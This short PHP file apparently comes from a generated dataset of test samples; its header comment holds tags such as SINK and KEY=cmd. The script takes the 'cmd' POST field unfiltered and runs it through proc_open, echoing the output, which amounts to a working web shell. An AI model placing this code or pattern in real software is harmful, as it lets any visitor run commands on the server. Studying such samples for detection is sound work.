<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=BODY_POST; CE_MODE=POST_AKE; SKELETON=S1; KEY=cmd; SINK=B5; VAR=v0102 */
function SINK_B5($command){
    $process = proc_open($command, [["pipe", "r"], ["pipe", "w"]], $pipes);
            if (is_resource($process)) {
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            fclose($pipes[0]);
            proc_close($process);
            echo $output;
}
}
$inp = array_key_exists("cmd", $_POST) ? (string)$_POST["cmd"] : "";
$inp = (string)$inp; // no value processing
function run_sink($x){
    return SINK_B5($x);
}
$out = run_sink($inp);
echo (string)($out);
?>
